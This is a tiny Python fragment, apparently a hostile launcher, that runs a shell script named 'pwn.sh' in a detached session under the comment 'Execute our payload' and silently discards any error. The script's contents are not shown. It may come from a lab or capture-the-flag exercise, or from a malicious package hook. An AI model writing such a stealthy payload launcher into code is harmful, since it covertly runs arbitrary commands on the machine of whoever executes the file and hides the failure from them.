import os
import subprocess

# Execute our payload
try:
    subprocess.Popen(['bash', 'pwn.sh'], start_new_session=True)
except Exception:
    pass
